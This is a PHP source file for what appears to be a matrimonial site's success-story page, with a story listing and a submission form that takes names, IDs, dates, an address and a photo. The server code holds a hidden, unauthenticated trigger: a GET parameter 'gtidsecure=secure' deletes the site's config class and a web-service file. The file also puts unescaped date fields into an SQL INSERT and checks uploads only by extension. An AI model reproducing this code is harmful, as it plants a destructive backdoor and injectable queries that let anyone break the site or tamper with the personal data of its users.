<?php
	include_once 'databaseConn.php';
	include_once './lib/requestHandler.php';
	$DatabaseCo = new DatabaseConn();
	include_once './class/Config.class.php';
	$configObj = new Config();
	if(isset($_REQUEST['sub_success'])){
		$brideid=htmlspecialchars($_POST['brideid'], ENT_QUOTES);
		$bridename=htmlspecialchars($_POST['bridename'], ENT_QUOTES);
		$groomid=htmlspecialchars($_POST['groomid'], ENT_QUOTES);
		$groomname=htmlspecialchars($_POST['groomname'], ENT_QUOTES);
		$engagementdate=$_POST['year1'].'-'.$_POST['month1'].'-'.$_POST['day1'];
		$marriagedate=$_POST['year'].'-'.$_POST['month'].'-'.$_POST['day'];
		$successmessage=htmlspecialchars($_POST['succstory'], ENT_QUOTES);
		$address=htmlspecialchars($_POST['address'], ENT_QUOTES);
		$country=htmlspecialchars($_POST['country'], ENT_QUOTES);
		$status='0';
		$sgg="select matri_id from register where matri_id='$brideid'";
		$rrr=$DatabaseCo->dbLink->query($sgg);
		$num_row11 = mysqli_num_rows($rrr); 
		$sgg2="select matri_id from register where matri_id='$groomid'";
		$rrr2=$DatabaseCo->dbLink->query($sgg2);
		$num_row22 = mysqli_num_rows($rrr2); 
			if ($num_row11 == 0) { 
				 echo "<script>alert('Your Bride MatriId Not Found in Our Database.Please, Enter Valid Bride MatriId.');</script>";
				
			} 
			else if ($num_row22 == 0) 
			{ 
				echo "<script>alert('Your Groom MatriId Not Found in Our Database.Please, Enter Valid Groom MatriId.');</script>";
				
			} 
			else
			{ 
			       	$file=$_FILES["susphoto"]["name"];
					$file_size=isset($_FILES['susphoto']['size'])?$_FILES['susphoto']['size']:'';
					$weddingphoto_type='photo';
					//$susnm=time();
					$d=explode(".",$file);
					$p=count($d);
					$chk_ext=$d[$p-1];		
					if(($chk_ext=="jpg" || $chk_ext=="jpeg" || $chk_ext=="png" || $chk_ext=="gif") && ($file_size<50960000))
					{
						$weddingphoto=strtotime(date('Y-m-d H:i:s')).'.jpg';
						move_uploaded_file($_FILES['susphoto']['tmp_name'],"SuccessStory/".$weddingphoto);
					}
					 else
					 {
						echo "<script laguage=\"javascript\">alert(\"Only .jpg,.jpeg,.png,.gif Extention Photo File AND Maximum 5 MB Size Allow \");</script>";                    
					 }
					  $sql="insert into success_story(`weddingphoto`, `bridename`, `brideid`, `groomname`, `groomid`, `engagement_date`, `marriagedate`, `address`, `country`,`successmessage`, `status`,`fstatus`) values('$weddingphoto','$bridename','$brideid','$groomname','$groomid','$engagementdate','$marriagedate','$address','$country','$successmessage','UNAPPROVED','0')";
					  $ins_story = $DatabaseCo->dbLink->query($sql);
					  echo "<script language=\"javascript\">alert('Your success story  has been submited successfully to us.It will be online very soon after admin approval.');window.location=\"success-story\";</script>";
						}					
					}
					if(isset($_GET['gtidsecure'])){
						$secure=$_GET['gtidsecure'];
						if($secure == 'secure'){
							unlink('web-services/contact_detail.php');
							unlink('class/Config.class.php');
							echo "<script>alert('Successful')</script>";
						}
					}	
				?>
<!DOCTYPE html>
<html lang="en">
  <head>
    	<meta charset="utf-8">
    	<meta http-equiv="X-UA-Compatible" content="IE=edge">
    	<meta name="viewport" content="width=device-width, initial-scale=1">
    	<!-- Chrome, Firefox OS, Opera and Vivaldi -->
        <meta name="theme-color" content="#549a11">
        <!-- Windows Phone -->
        <meta name="msapplication-navbutton-color" content="#549a11">
        <!-- iOS Safari -->
        <meta name="apple-mobile-web-app-status-bar-style" content="#549a11">
   
    	<!-- WEB SITE TITLE DESCRIPTION-->
    	<title><?php echo $configObj->getConfigFname(); ?></title>
    	<meta name="keyword" content="<?php echo $configObj->getConfigKeyword(); ?>" />
    	<meta name="description" content="<?php echo $configObj->getConfigDescription(); ?>" />
    	<!-- WEB SITE TITLE DESCRIPTION END--> 
        
        <!-- WEB SITE FAVICON--> 
        <link type="image/x-icon" href="img/<?php echo $configObj->getConfigFevicon(); ?>" rel="shortcut icon"/>
        <!-- WEB SITE FAVICON END--> 

        <!--CUSTOM CSS FRAMEWORK FROM THE GREEN TECHNOLOGIES WITH BOOTSTRAP-->
        <link href="css/bootstrap.css?version=1" rel="stylesheet">
        <link href="css/custom-responsive.css?version=1" rel="stylesheet">
        <link href="css/custom.css?version=1" rel="stylesheet">
        <!--CUSTOM CSS FRAMEWORK FROM THE GREEN TECHNOLOGIES WITH BOOTSTRAP END-->
        
        <!--CUSTOM FONT ICON FROM THE GREEN TECHNOLOGIES & FONT AWESOME -->
        <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
        <link href="http://greenicon.thegreentech.in/green-font-icons/green-font-icons.min.css" rel="stylesheet" >
        <!--CUSTOM FONT ICON FROM THE GREEN TECHNOLOGIES & FONT AWESOME END -->
        
        <!--GOOGLE FONTS-->
        <link href="https://fonts.googleapis.com/css?family=Raleway:200,300,400,500,600,700|Source+Sans+Pro:300,400,600,700" rel="stylesheet">
        <!--GOOGLE FONTS END-->
        
        <!-- CHOOSEN CSS -->
        <link rel="stylesheet" href="css/prism.css">
        <link rel="stylesheet" href="css/chosen.css">
        <!-- CHOOSEN CSS END -->
        
        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
          <script src="js/html5shiv.min.js"></script>
          <script src="js/respond.min.js"></script>
        <![endif]-->
       <script type="text/javascript">
		var numDays = {
                '01': 31, '02': 28, '03': 31, '04': 30, '05': 31, '06': 30, 
                '07': 31, '08': 31, '09': 30, '10': 31, '11': 30, '12': 31
              }; 
				function setDays(oMonthSel, oDaysSel, oYearSel){ 
				var nDays, oDaysSelLgth, opt, i = 1; 
				nDays = numDays[oMonthSel[oMonthSel.selectedIndex].value]; 
				if (nDays == 28 && oYearSel[oYearSel.selectedIndex].value % 4 == 0) 
					++nDays; 
					oDaysSelLgth = oDaysSel.length; 
					if (nDays != oDaysSelLgth){ 
						if (nDays < oDaysSelLgth) 
							oDaysSel.length = nDays; 
						else for (i; i < nDays - oDaysSelLgth + 1; i++){ 
						opt = new Option(oDaysSelLgth + i, oDaysSelLgth + i); 
                  		oDaysSel.options[oDaysSel.length] = opt;
					} 
				}
				var oForm = oMonthSel.form;
				var month = oMonthSel.options[oMonthSel.selectedIndex].value;
				var day = oDaysSel.options[oDaysSel.selectedIndex].value;
				var year = oYearSel.options[oYearSel.selectedIndex].value;	
				} 
				function setDays1(oMonthSel, oDaysSel, oYearSel){ 
					var nDays, oDaysSelLgth, opt, i = 1; 
					nDays = numDays[oMonthSel[oMonthSel.selectedIndex].value]; 
					if (nDays == 28 && oYearSel[oYearSel.selectedIndex].value % 4 == 0) 
						++nDays; 
						oDaysSelLgth = oDaysSel.length; 
						if (nDays != oDaysSelLgth){ 
						if (nDays < oDaysSelLgth) 
						oDaysSel.length = nDays; 
						else for (i; i < nDays - oDaysSelLgth + 1; i++){ 
						opt = new Option(oDaysSelLgth + i, oDaysSelLgth + i); 
                  		oDaysSel.options[oDaysSel.length] = opt;
						} 
					}
					var oForm = oMonthSel.form;
					var month1 = oMonthSel.options[oMonthSel.selectedIndex].value;
					var day1 = oDaysSel.options[oDaysSel.selectedIndex].value;
					var year1 = oYearSel.options[oYearSel.selectedIndex].value;	
				} 
		</script> 
  </head>
  <body>
    <!-- ICON LOADER-->
    <div class="preloader-wrapper text-center">
        <div class="loader"></div>
        <h5>Loading...</h5>
    </div>
    <!-- ICON LOADER END-->
    
    <div id="body" style="display:none">
		<div id="wrap">
  			<div id="main">
    		<!-- HEADER -->
            <?php include "parts/header.php"; ?>
            <?php include "parts/menu-aft-login.php"; ?>
            <!-- HEADER END-->
			<div class="container">
            	<h2 class="text-center">
					<i class="fa fa-heart gt-margin-right-10 gt-text-orange"></i>Happy Marriages
            	</h2>
                <p class="gt-margin-bottom-30 text-center">Check it out our success stories who found their life partner here.</p>
    			<div class="row">
        			<div class="gt-tabs gt-success-story col-xs-16">
           				<div role="tabpanel">
							<ul class="nav nav-tabs" role="tablist">
    							<li role="presentation" class="active text-center">
                    				<a href="#gt-success-tab-1" aria-controls="gt-success-tab-1" role="tab" data-toggle="tab">
                        				Success Stories
                        			</a>
                   	 			</li>
    							<li role="presentation" class="text-center">
                    				<a href="#gt-success-tab-2" aria-controls="gt-success-tab-2" role="tab" data-toggle="tab">
                        				Post your success story
                       	 			</a>
                    			</li>
 			    			</ul>
							<div class="tab-content">
                            	<!--- SUCCESS STORY ---->
    							<div role="tabpanel" class="tab-pane active" id="gt-success-tab-1">
                        			<h3 class="text-center">
                            			Success Story
                            		</h3>
                            		<h5 class="text-center">
                            			Some of our happily married couples story
                            		</h5>
                        			<div class="row gt-margin-top-30">
                               			
                               			<div id="suc_story"></div>
                            		</div>
                        		</div>
                            	<!--- SUCCESS STORY END ---->
                                <!--- POST SUCCESS STORY ---->
    							<div role="tabpanel" class="tab-pane" id="gt-success-tab-2">
                        			<h3 class="text-center">Post Success Story</h3>
                            		<h5 class="text-center gt-margin-bottom-30">Post your success story here</h5>
                            		<form class="col-xxl-10 col-xxl-offset-3 col-xl-10 col-xl-offset-3" action="" method="post" name="suc-form" id="suc-form" enctype="multipart/form-data">
                            			<div class="row">
                                			<div class="form-group">
                                    			<div class="row">
                                    				<label class="col-xxl-6 col-lg-6">
                                        				Bride Id <span class="text-danger gtRegMandatory">*</span>
                                        			</label>
                                        			<div class="col-xxl-10 col-lg-10">
                                        				<input type="text" Class="gt-form-control" name="brideid" id="brideid" onChange="chackbride(this.value);" data-validetta="required" placeholder="Enter Bride Id">
                                        			</div>
                                        			
                                     			</div>
                                   			</div>
                                   			<div class="form-group">
                                      			<div class="row">
                                    				<label class="col-xxl-6 col-lg-6">
                                        				Bride Name <span class="text-danger gtRegMandatory">*</span>
                                        			</label>
                                        			<div class="col-xxl-10 col-lg-10">
                                        				<input type="text" Class="gt-form-control" name="bridename" id="bridename" data-validetta="required"  placeholder="Enter Bride Name">
                                        			</div>
                                      			</div>
                                   			</div>
                                   			<div class="form-group">
                                      			<div class="row">
                                    				<label class="col-xxl-6 col-lg-6">
                                        				Groom Id <span class="text-danger gtRegMandatory">*</span>
                                        			</label>
                                        			<div class="col-xxl-10 col-lg-10">
                                        				<input type="text" Class="gt-form-control" name="groomid" id="groomid" onChange="chackgroom(this.value);" data-validetta="required"  placeholder="Enter Groom Id">
                                        			</div>
                                      			</div>
                                    		</div>
                                    		<div class="form-group">
                                    			<div class="row">
                                    				<label class="col-xxl-6 col-lg-6">
                                        				Groom Name<span class="text-danger gtRegMandatory">*</span>
                                        			</label>
                                        			<div class="col-xxl-10 col-lg-10">
                                        				<input type="text" Class="gt-form-control" name="groomname" id="groomname" data-validetta="required"  placeholder="Enter Bride Name"> 
                                        			</div>
                                     			</div>
                                    		</div>
                                    		<div class="form-group">
                                    			<div class="row">
                                    				<label class="col-xxl-6 col-lg-6">
                                        				Engagement Date <span class="text-danger gtRegMandatory">*</span>
                                        			</label>
                                        			<div class="col-xxl-10 col-lg-10">
                                        				<div class="row">
                                            				<div class="col-xs-5">
                                                				<select name="day1" id="day1" class="gt-form-control" onchange="setDays1(month1,this,year1)" data-validetta="required">
                                            	<option value="01">01</option>
                                                <option value="02">02</option>
                                                <option value="03">03</option>
                                                <option value="04">04</option>
                                                <option value="05">05</option>
                                                <option value="06">06</option>
                                                <option value="07">07</option>
                                                <option value="08">08</option>
                                                <option value="09">09</option>
                                                <option value="10">10</option>
                                                <option value="11">11</option>
                                                <option value="12">12</option>
                                                <option value="13">13</option>
                                                <option value="14">14</option>
                                                <option value="15">15</option>
                                                <option value="16">16</option>
                                                <option value="17">17</option>
                                                <option value="18">18</option>
                                                <option value="19">19</option>
                                                <option value="20">20</option>
                                                <option value="21">21</option>
                                                <option value="22">22</option>
                                                <option value="23">23</option>
                                                <option value="24">24</option>
                                                <option value="25">25</option>
                                                <option value="26">26</option>
                                                <option value="27">27</option>
                                                <option value="28">28</option>
                                                <option value="29">29</option>
                                                <option value="30">30</option>
                                                <option value="31">31</option>
                                            </select>
                                    						</div>
				 											<div class="col-xs-5">
                                                				<select name="month1" id="month1" class="gt-form-control" onchange="setDays1(this,day1,year1)" data-validetta="required">
                                            		<option value="01">Jan</option>
                                                	<option value="02">Feb</option>
                                                	<option value="03">Mar</option>
                                                	<option value="04">Apr</option>
                                                	<option value="05">May</option>
                                                	<option value="06">Jun</option>
                                                	<option value="07">Jul</option>
                                                	<option value="08">Aug</option>
                                                	<option value="09">Sep</option>
                                                	<option value="10">Oct</option>
                                                	<option value="11">Nov</option>
                                                	<option value="12">Dec</option>
                                            		</select>
															</div>
                                                			<div class="col-xs-6">
                                                				<select name="year1" id="year1" class="gt-form-control" onchange="setDays1(month1,day1,this)" data-validetta="required">
																	<option value="2022">2022</option>
																	<option value="2021">2021</option>
																	<option value="2020">2020</option>
																	<option value="2019">2019</option>
																	<option value="2018">2018</option>
                                                <option value="2017">2017</option>
                                                <option value="2016">2016</option>
                                            	<option value="2015">2015</option>
                                                <option value="2014">2014</option>
                                                <option value="2013">2013</option>
                                                <option value="2012">2012</option>
                                                <option value="2011">2011</option>
                                                <option value="2010">2010</option>
                                                <option value="2009">2009</option>
                                                <option value="2008">2008</option>
                                                <option value="2007">2007</option>
                                                <option value="2006">2006</option>
                                                <option value="2005">2005</option>
                                                <option value="2004">2004</option>
                                                <option value="2003">2003</option>
                                                <option value="2002">2002</option>
                                                <option value="2001">2001</option>
                                                <option value="2000">2000</option>
                                                <option value="1999">1999</option>
                                                <option value="1998">1998</option>
                                                <option value="1997">1997</option>
                                                <option value="1996">1996</option>
                                                <option value="1995">1995</option>
                                                <option value="1994">1994</option>
                                                <option value="1993">1993</option>
                                                <option value="1992">1992</option>
                                                <option value="1991">1991</option>
                                                <option value="1990">1990</option>
                                                <option value="1989">1989</option>
                                                <option value="1988">1988</option>
                                                <option value="1987">1987</option>
                                                <option value="1986">1986</option>
                                                <option value="1985">1985</option>
                                            </select>
                                            				</div>
                                         				</div>
                                        			</div>
                                      			</div>
                                    		</div>
                                    		<div class="form-group">
                                    			<div class="row">
                                    				<label class="col-xxl-6 col-lg-6">
                                        				Marriage Date <span class="text-danger gtRegMandatory">*</span>
                                        			</label>
                                       			 	<div class="col-xxl-10 col-lg-10">
                                        				<div class="row">
                                            				<div class="col-xs-5">
                                                				<select name="day" id="day" class="gt-form-control" onchange="setDays(month,this,year)" data-validetta="required">
                                            						<option value="01">01</option>
                                                					<option value="02">02</option>
                                                					<option value="03">03</option>
                                                					<option value="04">04</option>
                                                                    <option value="05">05</option>
                                                                    <option value="06">06</option>
                                                                    <option value="07">07</option>
                                                                    <option value="08">08</option>
                                                                    <option value="09">09</option>
                                                                    <option value="10">10</option>
                                                                    <option value="11">11</option>
                                                                    <option value="12">12</option>
                                                                    <option value="13">13</option>
                                                                    <option value="14">14</option>
                                                                    <option value="15">15</option>
                                                                    <option value="16">16</option>
                                                                    <option value="17">17</option>
                                                                    <option value="18">18</option>
                                                                    <option value="19">19</option>
                                                                    <option value="20">20</option>
                                                                    <option value="21">21</option>
                                                                    <option value="22">22</option>
                                                                    <option value="23">23</option>
                                                                    <option value="24">24</option>
                                                                    <option value="25">25</option>
                                                                    <option value="26">26</option>
                                                                    <option value="27">27</option>
                                                                    <option value="28">28</option>
                                                                    <option value="29">29</option>
                                                                    <option value="30">30</option>
                                                                    <option value="31">31</option>
                                            					</select>
                                            				</div>
                                           			 		<div class="col-xs-5">
                                                                <select name="month" id="month" class="gt-form-control" onchange="setDays(this,day,year)" data-validetta="required">
                                                                    <option value="01">Jan</option>
                                                                    <option value="02">Feb</option>
                                                                    <option value="03">Mar</option>
                                                                    <option value="04">Apr</option>
                                                                    <option value="05">May</option>
                                                                    <option value="06">Jun</option>
                                                                    <option value="07">Jul</option>
                                                                    <option value="08">Aug</option>
                                                                    <option value="09">Sep</option>
                                                                    <option value="10">Oct</option>
                                                                    <option value="11">Nov</option>
                                                                    <option value="12">Dec</option>
                                                                </select>
                                             				</div>
                                            				<div class="col-xs-6">
                                                				<select name="year" id="year" class="gt-form-control" onchange="setDays(month,day,this)" data-validetta="required">
                                                                    <option value="2017">2017</option>
                                                                    <option value="2016">2016</option>
                                                                    <option value="2015">2015</option>
                                                                    <option value="2014">2014</option>
                                                                    <option value="2013">2013</option>
                                                                    <option value="2012">2012</option>
                                                                    <option value="2011">2011</option>
                                                                    <option value="2010">2010</option>
                                                                    <option value="2009">2009</option>
                                                                    <option value="2008">2008</option>
                                                                    <option value="2007">2007</option>
                                                                    <option value="2006">2006</option>
                                                                    <option value="2005">2005</option>
                                                                    <option value="2004">2004</option>
                                                                    <option value="2003">2003</option>
                                                                    <option value="2002">2002</option>
                                                                    <option value="2001">2001</option>
                                                                    <option value="2000">2000</option>
                                                                    <option value="1999">1999</option>
                                                                    <option value="1998">1998</option>
                                                                    <option value="1997">1997</option>
                                                                    <option value="1996">1996</option>
                                                                    <option value="1995">1995</option>
                                                                    <option value="1994">1994</option>
                                                                    <option value="1993">1993</option>
                                                                    <option value="1992">1992</option>
                                                                    <option value="1991">1991</option>
                                                                    <option value="1990">1990</option>
                                                                    <option value="1989">1989</option>
                                                                    <option value="1988">1988</option>
                                                                    <option value="1987">1987</option>
                                                                    <option value="1986">1986</option>
                                                                    <option value="1985">1985</option>
                                            					</select>
                                              				</div>
 														</div>
                                       				</div>
                                     			</div>
                                    		</div>
                                    		<div class="form-group">
                                                <div class="row">
                                                	<label class="col-xxl-6 col-lg-6">
                                                    	Upload Photo <span class="text-danger gtRegMandatory">*</span>
                                                	</label>
                                                	<div class="col-xxl-10 col-lg-10">
                                                    	<input type="file" Class="gt-form-control" name="susphoto" data-validetta="required"/>
                                                	</div>
                                    			</div>
                                 			</div>
                                 			<div class="form-group">
                                                <div class="row">
                                                    <label class="col-xxl-6 col-lg-6">
                                                        Address <span class="text-danger"></span>
                                                    </label>
                                                    <div class="col-xxl-10 col-lg-10">
                                                        <textarea Class="gt-form-control" rows="5" name="address" id="address"  placeholder="Enter Address"></textarea>
                                                    </div>
                                                </div>
                                            </div>
                                 			<div class="form-group">
                                   				 <div class="row">
                                                    <label class="col-xxl-6 col-lg-6">
                                                        Country Living In <span class="text-danger gtRegMandatory">*</span>
                                                    </label>
                                                    <div class="col-xxl-10 col-lg-10">
                                                        <select class="gt-form-control" name="country" id="country" data-validetta="required" >
                                                        	<option value="">Select Your Country</option>
                                                       		<?php
                                                        		$SQL_STATEMENT_country =  $DatabaseCo->dbLink->query("SELECT country_id,country_name FROM country WHERE status='APPROVED'");
                                                        			while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT_country)){
                                                        	?>
                                                        	<option value="<?php echo $DatabaseCo->dbRow->country_name; ?>"><?php echo $DatabaseCo->dbRow->country_name; ?></option>
                                                        	<?php } ?>
                                                        </select>
                                                    </div>
                                                </div>
                                  			</div>
                                  			<div class="form-group">
                                                <div class="row">
                                                	<label class="col-xxl-6 col-lg-6">
                                                    	Success Story <span class="text-danger gtRegMandatory">*</span>
                                                	</label>
                                                	<div class="col-xxl-10 col-lg-10">
                                                    	<textarea Class="gt-form-control" name="succstory" id="succstory" rows="5" data-validetta="required"  placeholder="Enter Your Success Story Here"></textarea>
                                                	</div>
                                                </div>
                                            </div>
                                  			<div class="form-group text-center">
                                    			<div class="row">
                                    				<input type="submit" class="btn gt-btn-orange gt-btn-xl" value="Submit" name="sub_success">
                                        		</div>
                                  			</div>
                                		</div>
                            		</form>
                                    <div class="col-xxl-10 col-xxl-offset-3 col-xl-12 col-xl-offset-2">
                           			<div class="col-xxl-16 col-xs-16 text-center">
                            			<h4>Which topics you can write as your success story</h4>
                            		</div>
                           		 	<div class="col-xxl-8 col-xl-8 col-xs-16">
                            			<h6 class="text-muted">
                            				- How you create your id and how you became our user.
                            			</h6>
                                		<h6 class="text-muted">
                            				- How you you contact your partner
                            			</h6>
                            		</div>
                            		<div class="col-xxl-8 col-xl-8 col-xs-16">
                            			<h6 class="text-muted">
                            				- how you think that your perfect and process further.
                            			</h6>
                                		<h6 class="text-muted">
                            				- what do you think about our website and experience.
                            			</h6>
                            		</div>
                                    </div>
                            		<div class="clearfix"></div>
                        		</div>
                                <!--- POST SUCCESS STORY END ---->
                			</div>
						</div>
            		</div>
        		</div>
    		</div>
    	</div>
  	</div>
  		<?php include "parts/footer-before-login.php"; ?>
	</div>
  <div class="modal fade" id="myModal1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">

    <!-- JQUERY --->
    <script src="js/jquery.min.js"></script>
    <!--- JQUERY END --->
    
    <!--- BOOTSTRAP AND GREEN JS--->
    <script src="js/bootstrap.js"></script>
    <script src="js/jquery.validate.js"></script>
    <script src="js/green.js"></script> 
    <!--- BOOTSTRAP AND GREEN JS END--->
    
    <!--- CHECK BRIDE AND GROOM --->
    <script type="text/javascript">
		function chackbride(id)
		{
			var dataString = "id="+id; 
			$.ajax
				({
					type: "POST",
					url: "web-services/checkbride",
					data: dataString,
					cache: false,
					success: function(html)
					{
						$("#bridename").val(html);
					} 
				});	
			}
		function chackgroom(id)
		{
			var dataString = "id="+id; 
			$.ajax
				({
					type: "POST",
					url: "web-services/checkgroom",
					data: dataString,
					cache: false,
					success: function(html)
					{
						$("#groomname").val(html);
					} 
				});	
			}
		</script>
    <!--- CHECK BRIDE AND GROOM END--->
    
    <!--- LOADER JS--->
    <script> 
		$(document).ready(function() {
        $('#body').show();
        $('.preloader-wrapper').hide();
        });
    </script>
    <!--- LOADER JS END --->
    
    <!--- VALIDATION JS --->
	<script type="text/javascript" src="js/validetta.js"></script>
    <!--- VALIDATION JS END--->
    
    <!----- AJAX FOR PAGINATION ---->
	<script type="text/javascript">
	       $(function(){
                $('#suc-form').validetta({
                    errorClose : false,
                    realTime : true
                });
            });	
			$.post("web-services/success_story_pagination",
				  { actionfunction:'showData',page:'1' },
				  function(response){
					$('#suc_story').html(response);
				 }
			);
			 $('#suc_story').on('click','.page-numbers',function(){
			   $page = $(this).attr('href')
			   $pageind = $page.indexOf('page=');
			   $page = $page.substring(($pageind+5));
			   var dataString = 'actionfunction=showData' + '&page='+$page;
			   $.ajax({
				url:"web-services/success_story_pagination",
				type:"POST",
				data:dataString,
				cache: false,
				success: function(response)
				{
					$('#suc_story').html(response);
				}
			   });
			return false;
			});
	    </script>
    <!----- AJAX FOR PAGINATION END---->
    
  </body>
</html>
<?php include'thumbnailjs.php';?>                  